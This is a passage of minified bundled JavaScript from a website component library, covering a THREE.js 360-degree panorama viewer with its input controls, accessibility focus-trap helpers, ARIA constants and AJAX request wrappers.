i=l.lerpVectors(n,o,t);this.trigger(b.ROTATION_UPDATE,{t:e,easedVal:t,startPosition:f.startPosition,currentPosition:{lat:i.y,lon:i.x},targetPosition:{lat:o.x,lon:o.y}}),this._tmpCurrentPosition=i,this._renderer.positionCamera(i.x,i.y)})),this._currentTimer.promise.then((()=>{this.trigger(b.ROTATION_COMPLETE,f),this.setPos(e.lat,e.lon),this._animate(),this._currentTimer=null,this._tmpCurrentPosition=null,t()}))})).catch((()=>{}))}}b.ROTATION_START="RotationStart",b.ROTATION_UPDATE="RotationUpdate",b.ROTATION_COMPLETE="RotationComplete",b.POSITION_CHANGE="360PositionChange",t.exports=b},{"./controls/ArrowControls":15,"./controls/OrientationControls":17,"./controls/PointerControls":18,"./renderers/SphericalRenderer":19,"./utils/inverseLongitude":20,"./utils/loadScript":21,"./utils/map":22,"./utils/simpleTimer":24,"./utils/vector3FromLatLon":25,"@marcom/ac-easing/src/ac-easing/createBezier":120,"@marcom/ac-event-emitter-micro/EventEmitterMicro":123,"@marcom/ac-feature/webGLAvailable":132,"@marcom/ac-raf-emitter/cancelUpdate":7,"@marcom/ac-raf-emitter/update":10,"@marcom/useragent-detect":435}],14:[function(e,t,n){"use strict";t.exports=e("./AC360")},{"./AC360":13}],15:[function(e,t,n){"use strict";const i=e("./InertialControls"),r=e("../utils/normalizeLongitude"),o=e("@marcom/ac-raf-emitter/update"),s=e("@marcom/ac-raf-emitter/cancelUpdate"),a={acceleration:{x:.6,y:.6},friction:{x:.95,y:.95},minVelocity:.1,maxVelocity:20};t.exports=class extends i{constructor(e){super(e=Object.assign({},a,e)),this._bindMethods()}_bindMethods(){this.leftArrowDown=this.leftArrowDown.bind(this),this.rightArrowDown=this.rightArrowDown.bind(this),this.downArrowDown=this.downArrowDown.bind(this),this.upArrowDown=this.upArrowDown.bind(this),this.leftArrowUp=this.leftArrowUp.bind(this),this.rightArrowUp=this.rightArrowUp.bind(this),this.downArrowUp=this.downArrowUp.bind(this),this.upArrowUp=this.upArrowUp.bind(this),super._bindMethods()}leftArrowDown(){Math.abs(this._velocity.x-this._horizontalIncrement)<this._maxVelocity?this._velocity.x-=this._horizontalIncrement:this._velocity.x=-this._maxVelocity,this._lon=r(this._lon+this._velocity.x),this._triggerInertia()}rightArrowDown(){Math.abs(this._velocity.x+this._horizontalIncrement)<this._maxVelocity?this._velocity.x+=this._horizontalIncrement:this._velocity.x=this._maxVelocity,this._velocity.x+=this._horizontalIncrement,this._lon=r(this._lon+this._velocity.x),this._triggerInertia()}upArrowDown(e){Math.abs(this._velocity.y-this._verticalIncrement)<this._maxVelocity?this._velocity.y-=this._verticalIncrement:this._velocity.y=-this._maxVelocity,this._lat=this._lat+this._velocity.y,this._triggerInertia()}downArrowDown(){Math.abs(this._velocity.y+this._verticalIncrement)<this._maxVelocity?this._velocity.y+=this._verticalIncrement:this._velocity.y=this._maxVelocity,this._lat=this._lat+this._velocity.y,this._triggerInertia()}leftArrowUp(){this._triggerInertia()}rightArrowUp(){this._triggerInertia()}upArrowUp(){this._triggerInertia()}downArrowUp(){this._triggerInertia()}_triggerInertia(){s(this._inertiaRaf),o(this._updateInertia)}get isActive(){return Math.abs(this._velocity.x)>this._minVelocity||Math.abs(this._velocity.y)>this._minVelocity}}},{"../utils/normalizeLongitude":23,"./InertialControls":16,"@marcom/ac-raf-emitter/cancelUpdate":7,"@marcom/ac-raf-emitter/update":10}],16:[function(e,t,n){"use strict";const i=e("@marcom/ac-raf-emitter/update"),r=e("@marcom/ac-raf-emitter/cancelUpdate"),o=e("../utils/normalizeLongitude");t.exports=class{constructor(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};this._horizontalFriction=e.friction&&e.friction.x||.5,this._verticalFriction=e.friction&&e.friction.x||.5,this._horizontalIncrement=e.acceleration&&e.acceleration.x||.1,this._verticalIncrement=e.acceleration&&e.acceleration.y||.1,this._minVelocity=e.minVelocity||5,this._maxVelocity=e.maxVelocity||20,this._velocity={x:0,y:0},this._bindMethods()}_bindMethods(){this._updateInertia=this._updateInertia.bind(this)}_updateInertia(){Math.abs(this._velocity.x)>this._minVelocity||Math.abs(this._velocity.y)>this._minVelocity?(this._velocity.x*=this._horizontalFriction,this._velocity.y*=this._verticalFriction,this._lon+=this._velocity.x*this._horizontalIncrement,this._lat+=this._velocity.y*this._verticalIncrement,this._inertiaRaf=i(this._updateInertia)):(this._velocity={x:0,y:0},r(this._inertiaRaf),this._inertiaComplete())}cancelInertia(){this._velocity={x:0,y:0},r(this._inertiaRaf)}_inertiaComplete(){}set position(e){this._lat=e.lat,this._lon=o(e.lon)}get position(){return{lat:this._lat,lon:this._lon}}}},{"../utils/normalizeLongitude":23,"@marcom/ac-raf-emitter/cancelUpdate":7,"@marcom/ac-raf-emitter/update":10}],17:[function(e,t,n){"use strict";const i=e("../utils/normalizeLongitude"),r=e("@marcom/ac-console/log"),o=.02;t.exports=class{constructor(e){this._bindMethods()}_bindMethods(){this._onOrientation=this._onOrientation.bind(this)}_addEventListeners(){window.addEventListener("devicemotion",this._onOrientation,!0)}_removeEventListeners(){window.removeEventListener("devicemotion",this._onOrientation,!0)}_onOrientation(e){window.matchMedia("(orientation: portrait)").matches?(this._lon=i(this._lon-e.rotationRate.beta*o),this._lat=this._lat-e.rotationRate.alpha*o):e.orientation||-90===window.orientation?(this._lon=i(this._lon+e.rotationRate.alpha*o),this._lat=this._lat-e.rotationRate.beta*o):(this._lon=i(this._lon-e.rotationRate.alpha*o),this._lat=this._lat+e.rotationRate.beta*o)}set position(e){this._lat=e.lat,this._lon=i(e.lon)}get position(){return{lat:this._lat,lon:this._lon}}disable(){this._removeEventListeners()}enable(){this.requestPermission().then((()=>{this._addEventListeners()}))}requestPermission(){return this._permissionPromise||("function"!=typeof DeviceMotionEvent.requestPermission?this._permissionPromise=Promise.resolve():(this._permissionPromise=DeviceMotionEvent.requestPermission(),this._permissionPromise.catch((e=>{r("User didn't grant Gyro permission, or request wasn't tied to a user gesture"),this._permissionPromise=null})))),this._permissionPromise}destroy(){this._removeEventListeners()}}},{"../utils/normalizeLongitude":23,"@marcom/ac-console/log":69}],18:[function(e,t,n){"use strict";const i=e("../utils/normalizeLongitude"),r=e("./InertialControls"),o={acceleration:{x:.1,y:.1},friction:{x:.95,y:.95},minVelocity:.5,maxVelocity:20};t.exports=class extends r{constructor(e){super(e=Object.assign({},o,e)),this.el=e.el,this._mouseDown=!1,this._scale=1,this._hasInertia=!1!==e.inertia||e.inertia,this._bindMethods(),this._addEventListeners()}_bindMethods(){this._onMouseMove=this._onMouseMove.bind(this),this._onMouseDown=this._onMouseDown.bind(this),this._onMouseUp=this._onMouseUp.bind(this),this._onTouchMove=this._onTouchMove.bind(this),this._onClick=this._onClick.bind(this),super._bindMethods()}_addEventListeners(){this.el.addEventListener("mousedown",this._onMouseDown),this.el.addEventListener("touchstart",this._onMouseDown,{passive:!1}),this.el.addEventListener("click",this._onClick),this.el.addEventListener("touchmove",this._onTouchMove,{passive:!1})}_removeEventListeners(){this.el.removeEventListener("mousedown",this._onMouseDown),this.el.removeEventListener("touchstart",this._onMouseDown),window.removeEventListener("mousemove",this._onMouseMove),window.removeEventListener("mouseup",this._onMouseUp),this.el.removeEventListener("touchmove",this._onTouchMove),document.body.removeEventListener("touchmove",this._onTouchMove),document.body.removeEventListener("touchend",this._onMouseUp)}_onMouseUp(e){window.removeEventListener("mousemove",this._onMouseMove),window.removeEventListener("mouseup",this._onMouseUp),document.body.removeEventListener("touchmove",this._onTouchMove),document.body.removeEventListener("touchend",this._onMouseUp),this._mouseDown&&this._hasInertia&&Date.now()-this._mouseMoveTime<300&&this._updateInertia(),setTimeout((()=>{this._mouseDown||(this._dragging=!1)}),350),this._mouseDown=!1}sendMouseDown(e){this._onMouseDown(e)}_onClick(e){this._dragging||(this._velocity={x:0,y:0},this._mouseDown=!1,this._cachedPosition=e,document.removeEventListener("mousemove",this._onMouseMove),document.removeEventListener("mouseup",this._onMouseUp),document.body.removeEventListener("touchmove",this._onTouchMove),document.body.removeEventListener("touchend",this._onMouseUp))}_onMouseDown(e){this._mouseDownTime=Date.now();let t=e;if(e.touches){if(1!==e.touches.length)return;t=e.touches[0]}this._cachedPosition=e,window.addEventListener("mousemove",this._onMouseMove),window.addEventListener("mouseup",this._onMouseUp),document.body.addEventListener("touchmove",this._onTouchMove,{passive:!1}),document.body.addEventListener("touchend",this._onMouseUp),this._mouseDown=!0,this._lastMouseX=t.clientX,this._lastMouseY=t.clientY,this._lastMouseDownLon=i(this._lon),this._lastMouseDownLat=this._lat}_onTouchMove(e){e.cancelable&&e.preventDefault(),this._onMouseMove(e)}_onMouseMove(e){if(!this._mouseDown)return;this._dragging=!0;let t=e;if(e.touches&&(t=e.touches[0]),this._cachedPosition.clientX===t.clientX&&this._cachedPosition.clientY===t.clientY)return;const n=this._lastMouseX-t.clientX,r=this._lastMouseY-t.clientY,o=n/this._viewerWidth,s=r/this._viewerHeight;if(this._cachedPosition){const e=this._cachedPosition.clientX-t.clientX,n=this._cachedPosition.clientY-t.clientY;this._velocity.x=Math.max(Math.min(e,this._maxVelocity),-this._maxVelocity),this._velocity.y=Math.max(Math.min(n,this._maxVelocity),-this._maxVelocity)}this._lon=i(135*o+this._lastMouseDownLon),this._lat=90*s+this._lastMouseDownLat,this._cachedPosition=t,this._mouseMoveTime=Date.now()}get isActive(){return this._mouseDown||this._hasInertia&&(Math.abs(this._velocity.x)>this._minVelocity||Math.abs(this._velocity.y)>this._minVelocity)}get scale(){return this._scale}setViewerSize(e,t){this._viewerWidth=e,this._viewerHeight=t}destroy(){this._removeEventListeners()}}},{"../utils/normalizeLongitude":23,"./InertialControls":16}],19:[function(e,t,n){"use strict";const i=e("../utils/vector3FromLatLon"),r=e("@marcom/useragent-detect"),o=r.browser.safari&&r.os.osx?"high-performance":"default",s=e("@marcom/ac-raf-emitter/update");e("@marcom/ac-raf-emitter/cancelUpdate"),t.exports=class{constructor(e){this.el=e.el,this._distance=e.distance,this._textureSrc=e.src,this._pointerControls=e.pointerControls,this._videoElement=e.videoElement,this._maxLat=e.maxLat,e.useCanvasForVideoTexture&&(this._canvas=document.createElement("canvas"),this._canvas.width=this._videoElement.clientWidth||640,this._canvas.height=this._videoElement.clientHeight||480,this._canvasCtx=this._canvas.getContext("2d"))}attach(){const e=this.el.clientWidth,t=this.el.clientHeight,n=e/t;this._camera=new THREE.PerspectiveCamera(75,n,1,1100),this._camera.target=new THREE.Vector3(0,0,0),this._scene=new THREE.Scene,this._geometry=new THREE.SphereBufferGeometry(500,60,40),this._geometry.scale(-1,1,1),this._texture=this._createTexture(this._textureSrc),this._material=new THREE.MeshBasicMaterial({map:this._texture}),this._mesh=new THREE.Mesh(this._geometry,this._material),this._scene.add(this._mesh),this._renderer=new THREE.WebGLRenderer({antialias:!1,powerPreference:o}),this._renderer.setPixelRatio(window.devicePixelRatio),this._renderer.setSize(e,t),this._canvas&&this._tick()}_tick(){this._canvasCtx&&this._videoElement&&(this._canvasCtx.drawImage(this._videoElement,0,0,this._canvas.width,this._canvas.height),this._texture.needsUpdate=!0),s((()=>this._tick()))}update(e){const t=e,n=Math.max(-this._maxLat,Math.min(this._maxLat,t.lat)),i=THREE.Math.degToRad(90-n),r=THREE.Math.degToRad(t.lon),o=this._distance*Math.sin(i)*Math.cos(r),s=this._distance*Math.cos(i),a=this._distance*Math.sin(i)*Math.sin(r);return this._camera.zoom=this._pointerControls.scale,this._camera.position.x=o,this._camera.position.y=s,this._camera.position.z=a,this._camera.lookAt(this._camera.target),this._camera.updateProjectionMatrix(),this._renderer.render(this._scene,this._camera),{lat:n,lon:t.lon,x:o,y:s,z:a}}refreshSize(e,t){this._canvas&&(this._canvas.width=THREE.Math.ceilPowerOfTwo(this._videoElement.videoWidth||1),this._canvas.height=THREE.Math.ceilPowerOfTwo(this._videoElement.videoHeight||1)),this._camera.aspect=e/t,this._camera.updateProjectionMatrix(),this._renderer.setSize(e,t),this._renderer.render(this._scene,this._camera)}positionCamera(e,t){const n=i(t,e,this._distance);this._camera.position.copy(n),this._camera.lookAt(this._camera.target),this._camera.updateProjectionMatrix(),this._renderer.render(this._scene,this._camera)}get domElement(){return this._renderer.domElement}_createTexture(e){if(e instanceof HTMLVideoElement){this._videoElement=e,this._videoElement.setAttribute("playsinline","playsinline"),this._videoElement.setAttribute("webkit-playsinline","webkit-playsinline");const t=this._canvas?new THREE.CanvasTexture(this._canvas):new THREE.VideoTexture(this._videoElement);return t.minFilter=THREE.LinearFilter,t.format=THREE.RGBFormat,t}if(e.endsWith(".mp4")||e.endsWith(".m3u8")||e.endsWith(".webm")){this._videoElement||(this._videoElement=document.createElement("video")),this._videoElement.src=e,this._videoElement.loop=!0,this._videoElement.muted=!0,this._videoElement.crossOrigin="anonymous",this._videoElement.setAttribute("webkit-playsinline","webkit-playsinline"),this._videoElement.setAttribute("playsinline","playsinline"),this._videoElement=this._videoElement;const t=this._canvas?new THREE.CanvasTexture(this._canvas):new THREE.VideoTexture(this._videoElement);return t.minFilter=THREE.LinearFilter,t.format=THREE.RGBFormat,t}return(new THREE.TextureLoader).load(e)}async updateTexture(e){return new Promise((t=>{(new THREE.TextureLoader).load(e,(e=>{this._material.map=e,this._material.map.needsUpdate=!0,t()}))}))}}},{"../utils/vector3FromLatLon":25,"@marcom/ac-raf-emitter/cancelUpdate":7,"@marcom/ac-raf-emitter/update":10,"@marcom/useragent-detect":435}],20:[function(e,t,n){"use strict";const i=e("./normalizeLongitude");t.exports=e=>{let t=e;return Math.abs(t)>180?i(t):t>0?-360+t:360+t}},{"./normalizeLongitude":23}],21:[function(e,t,n){"use strict";t.exports=function(e){return new Promise(((t,n)=>{const i=document.createElement("script");i.type="text/javascript",i.src=e,i.onload=t,i.onerror=n;try{document.body.appendChild(i)}catch(e){n(e)}}))}},{}],22:[function(e,t,n){"use strict";t.exports=function(e,t,n,i,r){return i+(r-i)*(e-t)/(n-t)}},{}],23:[function(e,t,n){"use strict";t.exports=e=>{let t=e;return t>180?t=t%180-180:t<=-180&&(t=t%180+180),t}},{}],24:[function(e,t,n){"use strict";const i=e("@marcom/ac-raf-emitter/update");e("@marcom/ac-raf-emitter/cancelUpdate"),t.exports=function(e,t){let n,r=0,o=!1,s=new Promise(((n,s)=>{const a=performance.now(),c=()=>{if(o)return void s();const l=(performance.now()-a)/e;l>=1?(t(1),n()):(r=l,t(l),i(c))};i(c)}));return s.catch((()=>{n()})),{promise:s,cancel:()=>(o=!0,new Promise((e=>{n=()=>{e()}})))}}},{"@marcom/ac-raf-emitter/cancelUpdate":7,"@marcom/ac-raf-emitter/update":10}],25:[function(e,t,n){"use strict";t.exports=function(e,t,n){const i=THREE.Math.degToRad(90-e),r=THREE.Math.degToRad(t),o=n*Math.sin(i)*Math.cos(r),s=n*Math.cos(i),a=n*Math.sin(i)*Math.sin(r);return new THREE.Vector3(o,s,a)}},{}],26:[function(e,t,n){"use strict";var i=e("./helpers/TabManager"),r=e("./helpers/hideSiblingElements"),o=e("./helpers/showSiblingElements"),s=function(e,t){t=t||{},this._tabbables=null,this._excludeHidden=t.excludeHidden,this._firstTabbableElement=t.firstFocusElement,this._lastTabbableElement=null,this._relatedTarget=null,this.el=e,this._handleOnFocus=this._handleOnFocus.bind(this)},a=s.prototype;a.start=function(e){this.updateTabbables(),r(this.el,null,this._excludeHidden);let t=document.activeElement;this._firstTabbableElement?this.el.contains(document.activeElement)||e||(this._firstTabbableElement.focus(),t=this._firstTabbableElement):console.warn("this._firstTabbableElement is null, CircularTab needs at least one tabbable element."),this._relatedTarget=t,document.addEventListener("focus",this._handleOnFocus,!0)},a.stop=function(){o(this.el),document.removeEventListener("focus",this._handleOnFocus,!0)},a.updateTabbables=function(){this._tabbables=i.getTabbableElements(this.el,this._excludeHidden),this._firstTabbableElement=this._firstTabbableElement||this._tabbables[0],this._lastTabbableElement=this._tabbables[this._tabbables.length-1]},a._handleOnFocus=function(e){if(this.el.contains(e.target))this._relatedTarget=e.target;else{if(e.preventDefault(),this.updateTabbables(),this._relatedTarget===this._lastTabbableElement||null===this._relatedTarget)return this._firstTabbableElement.focus(),void(this._relatedTarget=this._firstTabbableElement);if(this._relatedTarget===this._firstTabbableElement&&this._lastTabbableElement)return this._lastTabbableElement.focus(),void(this._relatedTarget=this._lastTabbableElement)}},a.destroy=function(){this.stop(),this.el=null,this._tabbables=null,this._firstTabbableElement=null,this._lastTabbableElement=null,this._relatedTarget=null,this._handleOnFocus=null},t.exports=s},{"./helpers/TabManager":27,"./helpers/hideSiblingElements":29,"./helpers/showSiblingElements":32}],27:[function(e,t,n){"use strict";var i=e("./../maps/focusableElement"),r=function(){this.focusableSelectors=i.selectors},o=r.prototype;o.isFocusableElement=function(e,t,n){return!(t&&!this._isDisplayed(e)||(i.nodeName[e.nodeName]?e.disabled:e.contentEditable&&(n=n||parseFloat(e.getAttribute("tabindex")),isNaN(n))))},o.isTabbableElement=function(e,t){if(t&&!this._isDisplayed(e))return!1;var n=e.getAttribute("tabindex");return n=parseFloat(n),isNaN(n)?this.isFocusableElement(e,t,n):n>=0},o._isDisplayed=function(e){var t=e.getBoundingClientRect();return(0!==t.top||0!==t.left||0!==t.width||0!==t.height)&&"hidden"!==window.getComputedStyle(e).visibility},o.getTabbableElements=function(e,t){for(var n=e.querySelectorAll(this.focusableSelectors),i=n.length,r=[],o=0;o<i;o++)this.isTabbableElement(n[o],t)&&r.push(n[o]);return r},o.getFocusableElements=function(e,t){for(var n=e.querySelectorAll(this.focusableSelectors),i=n.length,r=[],o=0;o<i;o++)this.isFocusableElement(n[o],t)&&r.push(n[o]);return r},t.exports=new r},{"./../maps/focusableElement":34}],28:[function(e,t,n){"use strict";var i=e("./../maps/ariaMap"),r=e("./TabManager"),o="data-original-",s="tabindex",a=function(e,t){var n=e.getAttribute(o+t);n||(n=e.getAttribute(t)||"",e.setAttribute(o+t,n))};t.exports=function(e,t){if(r.isFocusableElement(e,t))a(e,s),e.setAttribute(s,"-1");else for(var n=r.getTabbableElements(e,t),o=n.length;o--;)a(n[o],s),n[o].setAttribute(s,"-1");a(e,i.HIDDEN),e.setAttribute(i.HIDDEN,"true")}},{"./../maps/ariaMap":33,"./TabManager":27}],29:[function(e,t,n){"use strict";var i=e("./hide");t.exports=function e(t,n,r){n=n||document.body;for(var o=t,s=t;o=o.previousElementSibling;)i(o,r);for(;s=s.nextElementSibling;)i(s,r);t.parentElement&&t.parentElement!==n&&e(t.parentElement,n,r)}},{"./hide":28}],30:[function(e,t,n){"use strict";t.exports=function(e,t){let n;n=e instanceof NodeList?e:[].concat(e),t=Array.isArray(t)?t:[].concat(t),n.forEach((e=>{t.forEach((t=>{e.removeAttribute(t)}))}))}},{}],31:[function(e,t,n){"use strict";var i=e("./removeAttributes"),r=e("./../maps/ariaMap"),o="data-original-",s="tabindex",a=function(e,t){var n=e.getAttribute(o+t);null!==n&&(""===n?i(e,t):e.setAttribute(t,n),i(e,o+t))};t.exports=function(e){a(e,s),a(e,r.HIDDEN);for(var t=e.querySelectorAll(`[${o+s}]`),n=t.length;n--;)a(t[n],s)}},{"./../maps/ariaMap":33,"./removeAttributes":30}],32:[function(e,t,n){"use strict";var i=e("./show");t.exports=function e(t,n){n=n||document.body;for(var r=t,o=t;r=r.previousElementSibling;)i(r);for(;o=o.nextElementSibling;)i(o);t.parentElement&&t.parentElement!==n&&e(t.parentElement,n)}},{"./show":31}],33:[function(e,t,n){"use strict";t.exports={AUTOCOMPLETE:"aria-autocomplete",CHECKED:"aria-checked",DISABLED:"aria-disabled",EXPANDED:"aria-expanded",HASPOPUP:"aria-haspopup",HIDDEN:"aria-hidden",INVALID:"aria-invalid",LABEL:"aria-label",LEVEL:"aria-level",MULTILINE:"aria-multiline",MULTISELECTABLE:"aria-multiselectable",ORIENTATION:"aria-orientation",PRESSED:"aria-pressed",READONLY:"aria-readonly",REQUIRED:"aria-required",SELECTED:"aria-selected",SORT:"aria-sort",VALUEMAX:"aria-valuemax",VALUEMIN:"aria-valuemin",VALUENOW:"aria-valuenow",VALUETEXT:"aria-valuetext",ATOMIC:"aria-atomic",BUSY:"aria-busy",LIVE:"aria-live",RELEVANT:"aria-relevant",DROPEFFECT:"aria-dropeffect",GRABBED:"aria-grabbed",ACTIVEDESCENDANT:"aria-activedescendant",CONTROLS:"aria-controls",DESCRIBEDBY:"aria-describedby",FLOWTO:"aria-flowto",LABELLEDBY:"aria-labelledby",OWNS:"aria-owns",POSINSET:"aria-posinset",SETSIZE:"aria-setsize"}},{}],34:[function(e,t,n){"use strict";t.exports={selectors:["input","select","textarea","button","optgroup","option","menuitem","fieldset","object","a[href]","[tabindex]","[contenteditable]"].join(","),nodeName:{INPUT:"input",SELECT:"select",TEXTAREA:"textarea",BUTTON:"button",OPTGROUP:"optgroup",OPTION:"option",MENUITEM:"menuitem",FIELDSET:"fieldset",OBJECT:"object",A:"a"}}},{}],35:[function(e,t,n){"use strict";var i=e("./request/factory"),r={complete:function(e,t){},error:function(e,t){},method:"GET",headers:{},success:function(e,t,n){},timeout:5e3},o={ajax:function(e,t){t=function(){for(var e=1;e<arguments.length;e++)for(var t in arguments[e])arguments[e].hasOwnProperty(t)&&(arguments[0][t]=arguments[e][t]);return arguments[0]}({},r,t),"//"===e.substr(0,2)&&(e=window.location.protocol+e);var n=i(e);return n.open(t.method,e),n.setTransportHeaders(t.headers),n.setReadyStateChangeHandlers(t.complete,t.error,t.success),n.setTimeout(t.timeout,t.error,t.complete),n.send(t.data),n},get:function(e,t){return t.method="GET",o.ajax(e,t)},head:function(e,t){return t.method="HEAD",o.ajax(e,t)},post:function(e,t){return t.method="POST",o.ajax(e,t)}};t.exports=o},{"./request/factory":36}],36:[function(e,t,n){"use strict";var i=e("./xmlhttprequest"),r=e("./xdomainrequest"),o=/.*(?=:\/\/)/,s=/^.*:\/\/|\/.+$/g,a=window.XDomainRequest&&document.documentMode<10;t.exports=function(e,t){return new(a&&function(e){return!!e.match(o)&&e.replace(s,"")!==window.location.hostname}(e)?r:i)}},{"./xdomainrequest":38,"./xmlhttprequest":39}],37:[function(e,t,n){"use strict";var i=function(){};i.create=function(){var e=function(){};return e.prototype=i.prototype,new e},i.prototype.open=function(e,t){e=e.toUpperCase(),this.xhr.open(e,t)},i.prototype.send=function(e){this.xhr.send(e)},i.prototype.setTimeout=function(e,t,n){this.xhr.ontimeout=function(){t(this.xhr,this.status),n(this.xhr,this.status)}.bind(this)},i.prototype.setTransportHeaders=function(e){for(var t in e)this.xhr.setRequestHeader(t,e[t])},t.exports=i},{}],38:[function(e,t,n){"use strict";var i=e("./request"),r=e("@marcom/ac-object/toQueryParameters"),o=function(){this.xhr=new XDomainRequest};(o.prototype=i.create()).setReadyStateChangeHandlers=function(e,t,n){this.xhr.onerror=function(){t(this.xhr,this.status),e(this.xhr,this.status)}.bind(this),this.xhr.onload=function(){n(this.xhr.responseText,this.xhr.status,this.xhr),e(this.xhr,this.status)}.bind(this)},o.prototype.send=function(e){e&&"object"==typeof e&&(e=r(e)),this.xhr.send(e)},o.prototype.setTransportHeaders=function(e){},t.exports=o},{"./request":37,"@marcom/ac-object/toQueryParameters":192}],39:[function(e,t,n){"use strict";var i=e("./request"),r=function(){this.xhr=new XMLHttpRequest};(r.prototype=i.create()).setReadyStateChangeHandlers=function(e,t,n){this.xhr.onreadystatechange=function(i){4===this.xhr.readyState&&(clearTimeout(this.timeout),this.xhr.status>=200&&this.xhr.status<300?(n(this.xhr.responseText,this.xhr.status,this.xhr),e(this.xhr,this.status)):(t(this.xhr,this.status),e(this.xhr,this.status)))}.bind(this)},t.exports=r},{"./request":37}],40:[function(e,t,n){"use strict";var i=e("./ac-ajax/Ajax"),r=e("./ac-ajax/Request");t.exports=new i,t.exports.Ajax=i,t.exports.Request=r},{"./ac-ajax/Ajax":41,"./ac-ajax/Request":42}],41:[function(e,t,n){"use strict";var i=e("./Request"),r=e("./XDomain-request"),o=e("./URLParser"),s=function(){};s._Request=i,s.prototype={_defaults:{method:"get",timeout:5e3},_extend:function(){for(var e=1;e<arguments.length;e++)for(var t in arguments[e])arguments[e].hasOwnProperty(t)&&(arguments[0][t]=arguments[e][t]);return arguments[0]},_getOptions:function(e,t){return this._extend({},this._defaults,t,e)},_isCrossDomainRequest:function(e){var t=new o,n=t.parse(window.location.href).origin,i=t.parse(e).origin;return t.destroy(),i!==n},create:function(e){return new i(e)},cors:function(e){return new(window.XDomainRequest&&document.documentMode<10?r:i)(e)},get:function(e){return e=this._getOptions({method:"get"},e),(this._isCrossDomainRequest(e.url)?this.cors(e):this.create(e)).send()},getJSON:function(e){return this.get(e).then((function(e){return JSON.parse(e.responseText)}))},head:function(e){return e=this._getOptions({method:"head"},e),this.create(e).send()},isCrossDomainRequest:function(e){return this._isCrossDomainRequest(e)},post:function(e){return e=this._getOptions({method:"post"},e),this.create(e).send()}},t.exports=s},{"./Request":42,"./URLParser":43,"./XDomain-request":44}],42:[function(e,t,n){"use strict";var i=function(e){this._initialize(e)};i.create=function(){var e=function(){};return e.prototype=i.prototype,new e},i.prototype={_addReadyStateChangeHandler:function(){this.xhr.onreadystatechange=function(e){4===this.xhr.readyState&&(clearTimeout(this._timeout),this.xhr.status>=200&&this.xhr.status<300?this.resolve(this.xhr):this.reject(this.xhr))}.bind(this)},_getPromise:function(){this.promise=new Promise(function(e,t){this.resolve=e,this.reject=t}.bind(this))},_getTransport:function(){return new XMLHttpRequest},_initialize:function(e){var t=this._validateConfiguration(e);if(t)throw t;this._configuration=e;var n=this._configuration.method.toUpperCase();this.xhr=this._getTransport(),this._getPromise(),this.xhr.open(n,this._configuration.url),this._setRequestHeaders(e.headers),this._addReadyStateChangeHandler()},_sendXHR:function(){this.xhr&&(this._configuration&&this._configuration.data?this.xhr.send(this._configuration.data):this.xhr.send())},_setRequestHeaders:function(e){e&&e.forEach((function(e){this.xhr.setRequestHeader(e.name,e.value)}),this)},_setTimeout:function(e){e||(this._configuration&&this._configuration.timeout?e=this._configuration.timeout:(clearTimeout(this._timeout),this._timeout=null)),null!==this._timeout&&clearTimeout(this._timeout),e>0&&(this._timeout=setTimeout(function(){this.xhr.abort(),this.reject()}.bind(this),e))},_timeout:null,_validateConfiguration:function(e){if(!e)return"Must provide a configuration object";var t=[],n=e.headers;if(e.url||t.push("Must provide a url"),e.method||t.push("Must provide a method"),n){if(!Array.isArray(n))return"Must provide an array of headers";this._validateHeaders(n,t)}return t.join(", ")},_validateHeaders:function(e,t){for(var n=0,i=e.length;n<i;n++)if(!e[n].hasOwnProperty("name")||!e[n].hasOwnProperty("value")){t.push("Must provide a name and value key for all headers");break}},promise:null,reject:null,resolve:null,send:function(){return this._setTimeout(),this._sendXHR(),this.promise},xhr:null},t.exports=i},{}],43:[function(e,t,n){"use strict";var i=function(){this.parser=null},r=i.prototype;r.parse=function(e){var t,n,i,r,o;if("string"!=typeof e)throw new TypeError(e+" must be a string");return this.parser||(this.parser=document.createElement("a")),this._qualifyPath(e),i=this.parser.hostname,n=this.parser.protocol,r=this._normalizePort(this.parser),t=this.parser.origin||this._constructOriginString(this.parser,r),o=this.parser.search,{originalPath:e,qualifiedPath:this.parser.href,protocol:n,hostname:i,origin:t,port:r,search:o}},r.destroy=function(){this.parser=null},r._constructOriginString=function(e,t){var n=t?":"+t:"";return e.protocol+"//"+e.hostname+n},r._normalizePort=function(e){return"80"===e.port||"443"===e.port||"0"===e.port?"":e.port},r._qualifyPath=function(e){this.parser.href=e,this.parser.href=this.parser.href},t.exports=i},{}],44:[function(e,t,n){"use strict";var i=e("./Request"),r=function(e){i.apply(this,arguments)};(r.prototype=i.create())._getTransport=function(){return new XDomainRequest},r.prototype._addReadyStateChangeHandler=function(){this.xhr.ontimeout=function(){this.reject(this.xhr)}.bind(this),this.xhr.onerror=function(){this.reject(this.xhr)}.bind(this),this.xhr.onload=function(){this.resolve(this.xhr)}.bind(this)},r.prototype._setTimeout=function(e){e||this._configuration&&this._configuration.timeout&&(e=this._configuration.timeout),e>0&&(this.xhr.timeout=e)},r.prototype._sendXHR=function(){setTimeout(function(){i.prototype._sendXHR.call(this)}.bind(this),0)},t.exports=r},{"./Request":42}],45:[function(e,t,n){"use strict";t.exports={log:e("./ac-console/log")}},{"./ac-console/log":46}],46:[function(e,t,n){"use strict";var i=!!function(){try{return window.localStorage.getItem("f7c9180f-5c45-47b4-8de4-428015f096c0")}catch(e){}}();t.exports=function(){window.console&&void 0!==console.log&&i&&console.log.apply(console,Array.prototype.slice.call(arguments,0))}},{}],47:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/Array/prototype.indexOf");var i=e("@marcom/ac-dom-nodes/isNode"),r=e("@marcom/ac-dom-nodes/COMMENT_NODE"),o=e("@marcom/ac-dom-nodes/DOCUMENT_FRAGMENT_NODE"),s=e("@marcom/ac-dom-nodes/DOCUMENT_NODE"),a=e("@marcom/ac-dom-nodes/ELEMENT_NODE"),c=e("@marcom/ac-dom-nodes/TEXT_NODE"),l=function(e,t){return!!i(e)&&("number"==typeof t?e.nodeType===t:-1!==t.indexOf(e.nodeType))},u=[a,s,o],h=[a,c,r];t.exports={parentNode:function(e,t,n,i){if(i=i||"node",(e||t)&&!l(e,u))throw new TypeError(n+": "+i+" must be an Element, Document, or Document Fragment")},childNode:function(e,t,n,i){if(i=i||"node",(e||t)&&!l(e,h))throw new TypeError(n+": "+i+" must be an Element, TextNode, or Comment")},selector:function(e,t,n,i){if(i=i||"selector",(e||t)&&"string"!=typeof e)throw new TypeError(n+": "+i+" must be a 